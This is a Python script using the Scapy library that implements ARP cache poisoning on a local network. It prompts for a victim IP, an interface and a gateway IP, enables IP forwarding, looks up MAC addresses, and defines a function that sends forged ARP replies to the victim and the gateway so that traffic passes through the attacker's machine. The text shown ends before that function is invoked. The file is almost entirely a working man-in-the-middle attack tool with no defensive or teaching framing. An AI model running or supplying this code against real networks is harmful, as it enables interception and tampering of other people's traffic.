from scapy.all import *
import os
import sys
import time

from scapy.layers.l2 import Ether, ARP, srp


def get_mac(ip,interface): # return the MAC address of the target
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),iface=interface,timeout=2, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# send ARP responses to the target and the gateway
def arp_poison(gateway_ip, gateway_mac, victim_ip, victim_mac, interface):
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), iface=interface)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), iface=interface)



def main():
    try:  # get information from the user
        victim_ip = input("Enter the IP address of the target: ")
        interface = input("Enter the interface: ")
        gateway_ip = input("Enter the gateway IP address: ")
    except KeyboardInterrupt:
        print("\n[-] User requested shutdown")
        print("[-] Exiting...")
        sys.exit(1)

    # enable IP forwarding
    print("\n[*] Enabling IP forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # get MAC addresses of victim machine and access point
    try:
        victim_mac = get_mac(victim_ip,interface)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # disable IP forwarding
        print("couldn't find victim MAC address")
        sys.exit(1)
    try:
        gateway_mac = get_mac(gateway_ip,interface)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # disable IP forwarding
        print("couldn't find gateway MAC address")
        sys.exit(1)




